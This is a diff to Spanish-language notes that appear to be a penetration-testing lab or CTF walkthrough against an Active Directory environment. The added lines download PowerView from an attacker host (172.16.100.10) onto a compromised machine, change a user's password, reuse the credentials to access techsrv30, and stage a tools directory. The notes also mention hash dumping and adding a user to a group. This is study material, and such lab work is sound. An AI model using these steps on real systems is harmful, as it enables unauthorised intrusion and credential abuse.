@@ -75,6 +75,8 @@ Accedemos a la maquina
 
 ![[Pasted image 20260714161107.png]]
 
+Cragaremos las herramintas usando el siguiente formatop
+Invoke-WebRequest -Uri "http://172.16.100.10/PowerView.ps1" -OutFile "PowerView.ps1"
 ## Dumpear hashes guardado
 ![[Pasted image 20260714162059.png]]
 
@@ -92,4 +94,13 @@ Cargamos PowerView y añadimos al ususario techservice al grupo Management
 
 
 Ahora cambiaremos la contraseña del ususario de puretech
+![[Pasted image 20260714164659.png]]
 
+Y usaremos las credenciales creadas para acceder a **techsrv30**
+![[Pasted image 20260714165005.png]]
+
+Crearemos un directorio dentro para cargar nuestras herraminetas
+New-Item -ItemType Directory -Force -Path C:\TempTools
+cd C:\TempTools
+
+Y cargaremos las herramintas necesrias
